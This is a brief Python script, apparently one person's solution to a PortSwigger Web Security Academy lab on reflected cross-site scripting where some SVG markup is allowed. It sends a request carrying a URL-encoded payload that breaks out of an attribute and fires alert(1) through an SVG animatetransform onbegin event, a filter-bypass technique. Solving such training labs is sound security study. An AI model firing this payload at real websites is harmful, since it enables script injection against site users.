#https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed

#-----------------
#DO IT IN BURP SUITE FIRST
#-----------------

from utils import *
url="https://0aeb00b503fcdbed860071e100cf001d.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E"
response=requests.get(url)
